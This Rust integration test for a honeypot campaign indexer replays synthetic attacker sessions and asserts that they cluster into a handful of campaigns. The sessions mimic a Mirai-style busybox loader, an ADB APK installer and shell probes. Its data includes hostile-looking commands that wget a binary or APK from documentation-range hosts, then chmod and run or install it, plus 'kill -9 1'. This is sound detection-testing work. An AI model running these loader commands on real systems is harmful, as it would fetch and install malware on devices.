//! A synthetic replica of the command-sequence campaigns the owner's console showed on 2026-10-08
//! (947 campaigns, most of them fragments of a few bots): the same shapes of traffic, none of the
//! data. It counts the command-sequence campaigns the indexer makes of them and asserts that the
//! families are a handful of campaigns, not one per session length or per random token. Run
//! against the previous fingerprint it reports the "before" count (`REPLICA` line on stderr).
//!
//! Addresses are RFC 5737; every command is synthetic.

use std::net::IpAddr;

use chrono::{DateTime, Duration, TimeZone, Utc};
use core_scoring::{EventInput, Protocol, SignalType, append_event};
use review::campaign::{self, BatchOutcome};
use sensor_framework::Uuid;
use serde_json::json;
use sqlx::PgPool;

fn t0() -> DateTime<Utc> {
    Utc.with_ymd_and_hms(2026, 10, 8, 4, 0, 0).unwrap()
}

struct Rng(u64);
impl Rng {
    fn next(&mut self) -> u64 {
        self.0 ^= self.0 >> 12;
        self.0 ^= self.0 << 25;
        self.0 ^= self.0 >> 27;
        self.0.wrapping_mul(0x2545_F491_4F6C_DD1D)
    }
    fn below(&mut self, n: u64) -> u64 {
        self.next() % n
    }
}

struct Replica<'a> {
    pool: &'a PgPool,
    hosts: u32,
}

impl Replica<'_> {
    /// One session from a fresh address, `cmds` two seconds apart.
    async fn session(&mut self, sensor: &str, cmds: &[String]) {
        self.hosts += 1;
        let ip = format!(
            "{}.{}",
            ["192.0.2", "198.51.100", "203.0.113"][(self.hosts / 250) as usize % 3],
            1 + self.hosts % 250
        );
        let session = Uuid::now_v7();
        let start = t0() + Duration::seconds(i64::from(self.hosts) * 7);
        for (i, c) in cmds.iter().enumerate() {
            append_event(
                self.pool,
                EventInput::from_signal(
                    ip.parse::<IpAddr>().unwrap(),
                    None,
                    sensor.into(),
                    SignalType::HoneypotCommandExec,
                    Protocol::Tcp,
                    true,
                    start + Duration::seconds(2 * i as i64),
                    json!({ "command": c }),
                    Some(session),
                ),
            )
            .await
            .unwrap();
        }
    }
}

fn strings(cmds: &[&str]) -> Vec<String> {
    cmds.iter().map(|s| s.to_string()).collect()
}

#[sqlx::test(migrations = false)]
async fn the_observed_fragments_are_a_handful_of_campaigns(pool: PgPool) {
    sqlx::migrate!("../core-scoring/migrations")
        .run(&pool)
        .await
        .unwrap();
    review::migrator().run(&pool).await.unwrap();
    let mut rng = Rng(0x0c70_b320_2026_1008);
    let mut r = Replica {
        pool: &pool,
        hosts: 0,
    };

    // 1. A Mirai-family loader: sixteen distinct commands, sessions that stopped anywhere.
    let mirai = [
        ">/var/run/.x&&cd /var/run;>/tmp/.x&&cd /tmp;>/dev/.x&&cd /dev",
        "/bin/busybox ZXCVB",
        "/bin/busybox cat /proc/mounts",
        "/bin/busybox ls /dev",
        "/bin/busybox wget http://192.0.2.7/bins/x86 -O .x",
        "/bin/busybox echo -ne '\\x7f\\x45\\x4c\\x46' > .x",
        "/bin/busybox echo -ne '\\x01\\x01\\x01' >> .x",
        "/bin/busybox chmod 777 .x",
        "./.x telnet.loader",
        "rm -f .x",
        "/bin/busybox ps",
        "/bin/busybox kill -9 1",
        "/bin/busybox uname -m",
        "/bin/busybox id",
        "/bin/busybox df",
        "/bin/busybox free",
    ];
    for _ in 0..40 {
        let cut = 1 + rng.below(16) as usize;
        r.session("telnet", &strings(&mirai[..cut])).await;
    }
    // 2. `start ; enable ; config terminal` and what follows, 3 to 8 lines.
    let entry = [
        "start",
        "enable",
        "config terminal",
        "system",
        "shell",
        "sh",
        "linuxshell",
        "su",
    ];
    for _ in 0..10 {
        let cut = 3 + rng.below(6) as usize;
        r.session("telnet", &strings(&entry[..cut])).await;
    }
    // 3. A busybox wget and echo loader, 1 to 9 commands.
    let echo = [
        "/bin/busybox wget;/bin/busybox echo -ne '\\x41' > .a",
        "/bin/busybox echo -ne '\\x42\\x43' >> .a",
        "/bin/busybox cat .a",
        "/bin/busybox chmod 755 .a",
        "./.a ssh",
        "/bin/busybox rm .a",
        "/bin/busybox sync",
        "/bin/busybox ps",
        "/bin/busybox uptime",
    ];
    for _ in 0..9 {
        let cut = 1 + rng.below(9) as usize;
        r.session("telnet", &strings(&echo[..cut])).await;
    }
    // 4. The ADB apk loader, 8 to 12 commands, one host each.
    let adb = [
        "rm -f '/data/local/tmp/gms-update.apk.b64'; echo",
        "echo -n 'QUJDREVGR0hJSktMTU5PUFFSU1RVVldYWVo=' >> /data/local/tmp/gms-update.apk.b64",
        "wc -c < /data/local/tmp/gms-update.apk.b64",
        "base64 -d /data/local/tmp/gms-update.apk.b64 > /data/local/tmp/gms-update.apk",
        "chmod 644 /data/local/tmp/gms-update.apk",
        "pm install -r /data/local/tmp/gms-update.apk",
        "rm -f /data/local/tmp/gms-update.apk.b64",
        "rm -f /data/local/tmp/gms-update.apk",
        "id",
        "getprop ro.build.version.release",
        "ls /data/local/tmp",
        "df",
    ];
    for _ in 0..5 {
        let cut = 8 + rng.below(5) as usize;
        r.session("adb", &strings(&adb[..cut])).await;
    }
    // 5. A marker the loader checks the shell with: only the number differs per session.
    for _ in 0..20 {
        let n = 100_000 + rng.below(800_000);
        r.session(
            "telnet",
            &[
                format!("echo P{n}A"),
                "id".to_string(),
                format!("echo $(( {n} + 1 ))"),
            ],
        )
        .await;
    }
    // 6. A one-line ADB loader with a random name per session.
    for i in 0..10u64 {
        let name = format!("{:09x}a", rng.next() & 0xfff_ffff_ffff);
        r.session(
            "adb",
            &[format!(
                "N={name}; cd /data/local/tmp; U=http://203.0.113.{}/gms.apk; wget $U -O $N; pm install $N",
                1 + i
            )],
        )
        .await;
    }
    // 7. HTTP requests sent to the telnet port, headers in whatever order the client used.
    let headers = [
        "User-Agent: Go-http-client/1.1",
        "Accept: application/json",
        "Node-Red-Api-Version: v2",
        "Accept-Encoding: gzip",
        "Content-Type: application/json",
    ];
    for i in 0..12usize {
        let mut order = strings(&headers);
        order.rotate_left(i % headers.len());
        order.truncate(2 + i % 4);
        r.session("telnet", &order).await;
    }
    // Later traffic moves each sensor's clock past every session's idle gap.
    for sensor in ["telnet", "adb"] {
        append_event(
            &pool,
            EventInput::from_signal(
                "192.0.2.254".parse::<IpAddr>().unwrap(),
                None,
                sensor.into(),
                SignalType::CatchallProbe,
                Protocol::Tcp,
                true,
                t0() + Duration::hours(6),
                json!({}),
                None,
            ),
        )
        .await
        .unwrap();
    }
    while campaign::index_batch(&pool, 1000).await.unwrap() != BatchOutcome::Indexed(0) {}

    let sessions = i64::from(r.hosts);
    let campaigns: i64 =
        sqlx::query_scalar("SELECT count(*) FROM campaign WHERE kind = 'command_sequence'")
            .fetch_one(&pool)
            .await
            .unwrap();
    let labels: Vec<(String, i32)> = sqlx::query_as(
        "SELECT left(label, 70), member_count FROM campaign WHERE kind = 'command_sequence' \
         ORDER BY member_count DESC, label",
    )
    .fetch_all(&pool)
    .await
    .unwrap();
    eprintln!("REPLICA sessions={sessions} command_sequence_campaigns={campaigns}");
    for (label, members) in &labels {
        eprintln!("REPLICA   {members:>3}  {label}");
    }
    // Mirai: the 3 short cuts and the rest; wget/echo loader: likewise; the other five families
    // are one campaign each. The previous fingerprint made one per session length or token.
    assert!(campaigns <= 4 + 4 + 5, "{campaigns}: {labels:?}");
}
